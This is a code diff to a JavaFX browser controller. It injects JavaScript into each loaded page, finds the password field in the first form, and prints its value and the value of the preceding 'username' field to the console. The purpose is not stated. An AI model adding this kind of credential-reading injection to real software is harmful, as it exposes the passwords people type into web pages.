@@ -174,8 +174,16 @@ public class MainController implements Initializable {
 					
 					doc = (Document) webEngine.getDocument();
 					currentUrlDoc(doc);
-					
-					//System.out.println(webEngine.executeScript("document.documentElement.outerHTML"));
+					webEngine.executeScript( "var allElements = document.getElementsByTagName('Form');"
+							+ "var list = allElements[0];"
+							+ "for (var i=0 ; i<list.length;i++){"
+							+ "var attr = document.forms[0].elements[i].attributes;"
+							+ "	if(list.elements[i].type=='password'){"
+							+ "console.log('Password: ',list.elements[i].value);"
+							+ "console.log('username: ',list.elements[i-1].value);"
+							+ "}"
+							+ "}");
+
 					
 					}
 					catch(Exception e){
